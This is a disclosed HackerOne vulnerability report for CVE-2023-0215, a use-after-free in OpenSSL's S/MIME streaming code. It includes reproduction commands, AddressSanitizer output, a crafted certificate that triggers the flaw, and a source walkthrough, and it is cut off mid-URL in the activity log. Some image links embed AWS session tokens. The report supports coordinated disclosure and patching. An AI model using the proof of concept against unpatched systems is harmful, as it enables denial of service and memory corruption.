{
  "id": 1906897,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTA2ODk3",
  "url": "https://hackerone.com/reports/1906897",
  "title": "UAF in OpenSSL up to 3.0.7",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-03-15T01:18:16.821Z",
  "submitted_at": "2023-03-15T01:18:16.905Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ogalland",
    "url": "/ogalland",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065642Z&X-Amz-Expires=3178&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cd857bd3fe6038d197776bec2f2caee72ccf41da057ff9929578dfd7d523f116",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065642Z&X-Amz-Expires=3178&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eaa4aa6b652c10668ec19f469f3aa28d840db282e7f44e24ee758647320b83be"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-0215"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-03-18T18:31:24.111Z",
  "bug_reporter_agreed_on_going_public_at": "2023-03-18T18:31:24.018Z",
  "team_member_agreed_on_going_public_at": "2023-03-17T19:28:41.608Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "There is a heap-based UAF vulnerability in OpenSSL up to version 3.0.7 (note that it affected version branches 1.0 and 1.1 as well). I include the report that was sent to the OpenSSL security team, with an update concerning reproducibility.\nThe vulnerability was triaged by the OpenSSL security team, got assigned CVE-2023-0215 with MODERATE severity (https://www.openssl.org/news/secadv/20230207.txt) and has been fixed in versions 3.0.8, 1.1.1t and 1.0.2zg.\n\n# Summary\n\nThere is a heap-based use after free in the function `BIO_new_NDEF`. This UAF can be triggered when encrypting S/MIME messages with the `-stream` option enabled if the function `cms_cb` returns an error code.\nThe error was found in OpenSSL release 3.0.7, and was later confirmed both to be present in OpenSSL 3.0 development branch and to have existed since OpenSSL 3.0.0.\nAlthough we have not been able to verify it, we believe that this bug might have existed since 2008, when CMS functionality was first introduced.\n\n# How to reproduce\n\nTested on Ubuntu 22.04\n\n```\ngit clone https://github.com/openssl/openssl\ncd openssl\ngit checkout openssl-3.0.7\nCC=clang-14 CFLAGS=\"-O0 -g -fno-omit-frame-pointer -fsanitize=address\" LDFLAGS=\"-fsanitize=address\" ./Configure\nmake -j$(nproc)\nLD_LIBRARY_PATH=$(pwd) ./apps/openssl cms -encrypt -in ./test/smcont.txt -stream -recip ./test/smime-certs/smec1.pem -des\n```\n\nNote that -des is specified here in order to induce an error during the call to `ossl_cms_EncryptedContent_init_bio`, but if any other error occured during execution of `cms_cb` (such as a bad allocation) the UAF would still get triggered (see Analysis section below).\nIn general, specifying some symmetric ciphers (https://www.openssl.org/docs/man3.0/man1/openssl-enc.html#SUPPORTED-CIPHERS) does seem to trigger the error as well. We were able to reproduce the error with bf, des, des-ede, rc4.\nWe are currently not aware of any way to trigger the bug via a faulty recipient certificate. However, if an attacker was able to craft a malicious certificate capable of making `cms_cb` return 0, then the bug could be triggered when a victim tried to encrypt a message with the attacker as a recipient by using their malicious certificate.\n\nHere is the ASAN report for the UAF:\n\n```\n$ ./apps/openssl cms -encrypt -in ./test/smcont.txt -stream -recip ./test/smime-certs/smec1.pem -des\nMIME-Version: 1.0\nContent-Disposition: attachment; filename=\"smime.p7m\"\nContent-Type: application/pkcs7-mime; smime-type=enveloped-data; name=\"smime.p7m\"\nContent-Transfer-Encoding: base64\n\n=================================================================\n==64886==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d000001198 at pc 0x55c4cc5b6f29 bp 0x7ffff4877ae0 sp 0x7ffff4877ad8\nWRITE of size 8 at 0x60d000001198 thread T0\n    #0 0x55c4cc5b6f28 in BIO_pop /home/ogalland/ossl/crypto/bio/bio_lib.c:678:31\n    #1 0x55c4ccad6785 in B64_write_ASN1 /home/ogalland/ossl/crypto/asn1/asn_mime.c:121:5\n    #2 0x55c4ccad6eee in SMIME_write_ASN1_ex /home/ogalland/ossl/crypto/asn1/asn_mime.c:324:10\n    #3 0x55c4cc62f57d in SMIME_write_CMS /home/ogalland/ossl/crypto/cms/cms_io.c:92:12\n    #4 0x55c4cc3214e4 in cms_main /home/ogalland/ossl/apps/cms.c:1224:23\n    #5 0x55c4cc3500c6 in do_cmd /home/ogalland/ossl/apps/openssl.c:418:16\n    #6 0x55c4cc34f8fd in main /home/ogalland/ossl/apps/openssl.c:298:11\n    #7 0x7ff97992cd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #8 0x7ff97992ce3f in __libc_start_main csu/../csu/libc-start.c:392:3\n    #9 0x55c4cc23b0a4 in _start (/home/ogalland/ossl/apps/openssl+0x3780a4) (BuildId: c47faa80842a319a2e75f78800f870b539fd546a)\n\n0x60d000001198 is located 72 bytes inside of 136-byte region [0x60d000001150,0x60d0000011d8)\nfreed by thread T0 here:\n    #0 0x55c4cc2bdc42 in free (/home/ogalland/ossl/apps/openssl+0x3fac42) (BuildId: c47faa80842a319a2e75f78800f870b539fd546a)\n    #1 0x55c4cc7a25d8 in CRYPTO_free /home/ogalland/ossl/crypto/mem.c:258:5\n    #2 0x55c4cc5b335d in BIO_free /home/ogalland/ossl/crypto/bio/bio_lib.c:154:5\n    #3 0x55c4ccadbe8a in BIO_new_NDEF /home/ogalland/ossl/crypto/asn1/bio_ndef.c:100:5\n    #4 0x55c4ccad5fc3 in i2d_ASN1_bio_stream /home/ogalland/ossl/crypto/asn1/asn_mime.c:77:15\n    #5 0x55c4ccad6764 in B64_write_ASN1 /home/ogalland/ossl/crypto/asn1/asn_mime.c:119:9\n    #6 0x55c4ccad6eee in SMIME_write_ASN1_ex /home/ogalland/ossl/crypto/asn1/asn_mime.c:324:10\n    #7 0x55c4cc62f57d in SMIME_write_CMS /home/ogalland/ossl/crypto/cms/cms_io.c:92:12\n    #8 0x55c4cc3214e4 in cms_main /home/ogalland/ossl/apps/cms.c:1224:23\n    #9 0x55c4cc3500c6 in do_cmd /home/ogalland/ossl/apps/openssl.c:418:16\n    #10 0x55c4cc34f8fd in main /home/ogalland/ossl/apps/openssl.c:298:11\n    #11 0x7ff97992cd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n\npreviously allocated by thread T0 here:\n    #0 0x55c4cc2bdeee in __interceptor_malloc (/home/ogalland/ossl/apps/openssl+0x3faeee) (BuildId: c47faa80842a319a2e75f78800f870b539fd546a)\n    #1 0x55c4cc7a246b in CRYPTO_malloc /home/ogalland/ossl/crypto/mem.c:190:12\n    #2 0x55c4cc7a24a2 in CRYPTO_zalloc /home/ogalland/ossl/crypto/mem.c:197:11\n    #3 0x55c4cc5b2ab8 in BIO_new_ex /home/ogalland/ossl/crypto/bio/bio_lib.c:83:16\n    #4 0x55c4cc5b2f08 in BIO_new /home/ogalland/ossl/crypto/bio/bio_lib.c:123:12\n    #5 0x55c4ccadbac1 in BIO_new_NDEF /home/ogalland/ossl/crypto/asn1/bio_ndef.c:65:15\n    #6 0x55c4ccad5fc3 in i2d_ASN1_bio_stream /home/ogalland/ossl/crypto/asn1/asn_mime.c:77:15\n    #7 0x55c4ccad6764 in B64_write_ASN1 /home/ogalland/ossl/crypto/asn1/asn_mime.c:119:9\n    #8 0x55c4ccad6eee in SMIME_write_ASN1_ex /home/ogalland/ossl/crypto/asn1/asn_mime.c:324:10\n    #9 0x55c4cc62f57d in SMIME_write_CMS /home/ogalland/ossl/crypto/cms/cms_io.c:92:12\n    #10 0x55c4cc3214e4 in cms_main /home/ogalland/ossl/apps/cms.c:1224:23\n    #11 0x55c4cc3500c6 in do_cmd /home/ogalland/ossl/apps/openssl.c:418:16\n    #12 0x55c4cc34f8fd in main /home/ogalland/ossl/apps/openssl.c:298:11\n    #13 0x7ff97992cd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n\nSUMMARY: AddressSanitizer: heap-use-after-free /home/ogalland/ossl/crypto/bio/bio_lib.c:678:31 in BIO_pop\nShadow bytes around the buggy address:\n  0x0c1a7fff81e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa\n  0x0c1a7fff81f0: fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd\n  0x0c1a7fff8200: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa\n  0x0c1a7fff8210: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c1a7fff8220: 00 fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd\n=>0x0c1a7fff8230: fd fd fd[fd]fd fd fd fd fd fd fd fa fa fa fa fa\n  0x0c1a7fff8240: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c1a7fff8250: fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa\n  0x0c1a7fff8260: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c1a7fff8270: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c1a7fff8280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07\n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==64886==ABORTING\n```\n\nThis bug, however, is not specific to the `cms` command. As an example, here is the command line we used to trigger the same error by using the `smime` command:\n\n```\nLD_LIBRARY_PATH=$(pwd) ./apps/openssl smime -provider-path ./providers -encrypt -in ./test/smcont.txt -des -stream ./test/smime-certs/smrsa1.pem ./test/smime-certs/smrsa2.pem ./test/smime-certs/smrsa3.pem\n```\n\n[Reproducibility update]\n\nThe following recipient public key will demonstrate the UaF for any cipher when the CMS_STREAM flag is set.\n\n```\ncat << EOF > key.pub\n-----BEGIN CERTIFICATE-----\nMIIDbTCCAlWgAwIBAgIToTV4Z0iuK08vZP20oTh//hC8BDANBgkqhkiG9w0BAQ0FADAtMSswKQYD\nVfcDEyJTYW1wbGUgTEFNUFMgQ2VydGlmaWNhdGUgQXV0aG9yaXR5MCAXDTE5MTEyMDA2NTQxOFoY\nDzIwNTIwOTI3MDY1NDE4WjAZMRcwFQYDVQQDEw5BbGljZSBMb3ZlbGFjZTCCASIwDQYJKoZIhvcN\nAQEBBQADggEPADCCAQoCggEBALT0iehYOBY+TZp/T5K2KNI05Hwr+E3wP6XTvyi6WWyTgBK9LCOw\nI2juwdRrjFBmXkk7pWpjXwsA3A5GOtz0FpfgyC7OxsVcF7q4WHWZWleYXFKlQHJD73nQwXP968+A\n/3rBX7PhO0DBbZnfitOLPgPEwjTtdg0VQQ6Wz+CRQ/YbHPKaw7aRphZO63dKvIKp4cQVtkWQHi6s\nyTjGsgkLcLNau5LZDQUdsGV+SAo3nBdWCRYV+I65x8Kf4hCxqqmjV3d/2NKRu0BXnDe/N+iDz3X0\nzEoj0fqXgq4SWcC0nsG1lyyXt1TL270I6ATKRGJWiQVCCpDtc0NT6vdJ45bCSxgCAwEAAaOBlzCB\nlDAMBgNVHRMBAf8EAjAAMB4GA1UdEQQXMBWBE2FsaWNlQHNtaW1lLmV4YW1wbGUwEwYDVR0lBAww\nCgYIKwYBBQUHAwQwDwYDVR0PAQH/BAUDAwfAADAdBgNVHQ4EFgQUu/bMsi0dBhIcl64papAQ0yBm\nZnMwHwYDVR0jBBgwFoAUeF8OWnjYa+RUcD2z3ez38fL6wEcwDQYJKoZIhvcNAQENBQADggEBABbW\neonR6TMTckehDKNOabwaCIcekahAIL6l9tTzUX5ew6ufiAPlC6I/zQlmUaU0iSyFDG1NW14kNbFt\n5CAokyLhMtE4ASHBIHbiOp/ZSbUBTVYJZB61ot7w1/ol5QECSs08b8zrxIncf+t2DHGuVEy/Qq1d\nrBz8d4ay8zpqAE1tUyL5Da6ZiKUfWwZQXSI/JlbjQFzYQqTRDnzHWrg1xPeMTO1P2/cplFaseTiv\nyk4cYwOp/W9UAWymOZXF8WcJYCIUXkdcG/nEZxr057KlScrJmFXOoh7Y+8ON4iWYYcAfiNgpUFo/\nj8BAwrKKaFvdlZS9k1Ypb2+UQY75mKJE9Bg=\n-----END CERTIFICATE-----\nEOF\n\n./apps/openssl cms -encrypt -in <(echo \"\") -stream -recip key.pub\n```\n\nThis way of reproducing implies that it can be triggered by trying to encrypt a message with an public key provided by a malicious actor.\n\n# Analysis\n\nLooking at the source code tree for OpenSSL 3.0.7:\n\n```\n// excerpt from crypto/asn1/bio_ndef.c\nBIO *BIO_new_NDEF(BIO *out, ASN1_VALUE *val, const ASN1_ITEM *it) {\n[...]\n    asn_bio = BIO_new(BIO_f_asn1());                             // (1)\n    if (ndef_aux == NULL || asn_bio == NULL)\n        goto err;\n\n    /* ASN1 bio needs to be next to output BIO */\n    out = BIO_push(asn_bio, out);                            // (2)\n    if (out == NULL)\n        goto err;\n\n    BIO_asn1_set_prefix(asn_bio, ndef_prefix, ndef_prefix_free);\n    BIO_asn1_set_suffix(asn_bio, ndef_suffix, ndef_suffix_free);\n\n    /*\n     * Now let callback prepends any digest, cipher etc BIOs ASN1 structure\n     * needs.\n     */\n\n    sarg.out = out;\n    sarg.ndef_bio = NULL;\n    sarg.boundary = NULL;\n\n    if (aux->asn1_cb(ASN1_OP_STREAM_PRE, &val, it, &sarg) <= 0)                // (3)\n        goto err;\n[...]\n err:\n    BIO_free(asn_bio);                                    // (4)\n    OPENSSL_free(ndef_aux);\n    return NULL;\n```\n\n`BIO_new_NDEF` allocates a new BIO object (1) and pushes it into the BIO that got passed in as paramterer (2). If the call at (3) fails, then execution jumps to the error handling code at `err`, which frees the allocated BIO. However the freed BIO is still referenced in the field `prev_bio` of the `out` BIO passed as a parameter.\nThe problem shows when this function is called by `i2d_ASN1_bio_stream`, which also receives a BIO object (5) and passes it to `BIO_new_NDEF` (6), and upon failure of `BIO_new_NDEF` also propagates the error (7):\n\n```\n// excerpt from crypto/asn1/asn_mime.c\nint i2d_ASN1_bio_stream(BIO *out, ASN1_VALUE *val, BIO *in, int flags,            // (5)\n                        const ASN1_ITEM *it)\n{\n    int rv = 1;\n\n    /* If streaming create stream BIO and copy all content through it */\n    if (flags & SMIME_STREAM) {\n        BIO *bio, *tbio;\n        bio = BIO_new_NDEF(out, val, it);                        // (6)\n        if (!bio) {\n            ERR_raise(ERR_LIB_ASN1, ERR_R_MALLOC_FAILURE);\n            return 0;                                    // (7)\n        }\n[...]\n```\n\nAgain, this is called by `B64_write_ASN1` (8). Which tries to pop the `out` BIO it passed to `i2d_ASN1_bio_stream` (9), but the BIO still holds a reference (via its `prev_bio` field) to the previously freed BIO (4):\n\n```\n// excerpt from crypto/asn1/asn_mime.c\nstatic int B64_write_ASN1(BIO *out, ASN1_VALUE *val, BIO *in, int flags,\n                          const ASN1_ITEM *it)\n{\n    BIO *b64;\n    int r;\n    b64 = BIO_new(BIO_f_base64());\n    if (b64 == NULL) {\n        ERR_raise(ERR_LIB_ASN1, ERR_R_MALLOC_FAILURE);\n        return 0;\n    }\n    /*\n     * prepend the b64 BIO so all data is base64 encoded.\n     */\n    out = BIO_push(b64, out);\n    r = i2d_ASN1_bio_stream(out, val, in, flags, it);                    // (8)\n    (void)BIO_flush(out);\n    BIO_pop(out);                                    // (9)\n    BIO_free(b64);\n    return r;\n}\n```\n\nAs stated in the previous section, this can only occur if an error takes place during (3). We haven't been able to trigger any such error remotely when executing the `openssl` command line utility in an intended way. However, the vulnerability might be exploitable if an application using OpenSSL's libraries invoked API functions related to CMS/SMIME/PKCS7 functionality (several of which result in calls being made to `B64_write_ASN1`) without properly validating its arguments.\n\nGiven some difficulties we have had when building older OpenSSL versions, we were not able to pinpoint exactly when this bug was introduced. But through manual code review we arrived at the conclusion that it might have been introduced when initial support for CMS functionality was added (https://github.com/openssl/openssl/commit/8931b30d8478b0bd24af251fac64e7b0bf121369).\n\n# Discovery\n\nThe UAF was found via fuzzing. It was discovered using Autoharness, a fuzzer prototype currently under development within the context of Octavio Galland's internship in Dr. Marcel Böhme's group at the Max Planck Institute for Security and Privacy. The fix was developed by Viktor Dukhovni and Matt Caswell.\n\n## Impact\n\nThis vulnerability allows an attacker to corrupt memory by manipulating a node from a linked list after said node was freed. Within the context of the command line utilities provided by the OpenSSL team this can be used to trigger a remote DoS. But since this functionality is exposed as part of the libcrpyto library, any user of this piece of functionality might be potentially exposed to more severe vulnerabilities depending on how they use this library.",
  "weakness": {
    "id": 50,
    "name": "Use After Free"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [

  ],
  "allow_singular_disclosure_at": "2023-04-16T19:28:41.705Z",
  "allow_singular_disclosure_after": -13778880.629843965,
  "singular_disclosure_allowed": true,
  "vote_count": 12,
  "voters": [
    "pentestor",
    "0x0desha74",
    "zy9ard3",
    "yassinek3ch",
    "shubham_srt",
    "h4x0r_dz",
    "shivammusic",
    "sajx",
    "m4ndalorian",
    "abduuuuu",
    "and 2 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 80989,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/openssl/openssl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 20830856,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Starting the check process.",
      "automated_response": false,
      "created_at": "2023-03-15T18:17:18.913Z",
      "updated_at": "2023-03-15T18:17:18.913Z",
      "actor": {
        "username": "kunderkoffler",
        "cleared": false,
        "verified": false,
        "url": "/kunderkoffler",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "ibb"
    },
    {
      "id": 20863974,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "The project has rated this vulnerability as a Medium.",
      "automated_response": false,
      "created_at": "2023-03-17T19:24:54.234Z",
      "updated_at": "2023-03-17T19:24:54.234Z",
      "additional_data": {
        "old_severity": null,
        "new_severity": "Medium",
        "old_severity_id": null,
        "new_severity_id": 1909518
      },
      "actor": {
        "username": "kunderkoffler",
        "cleared": false,
        "verified": false,
        "url": "/kunderkoffler",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "ibb"
    },
    {
      "id": 20863996,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "Thank you for your contribution to making the Internet safer!\n\nThis bounty was awarded with a 80/20% split. An additional $600 will be paid to the project.",
      "automated_response": false,
      "created_at": "2023-03-17T19:28:13.388Z",
      "updated_at": "2023-03-17T19:28:13.388Z",
      "actor": {
        "url": "/ibb",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065642Z&X-Amz-Expires=3178&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9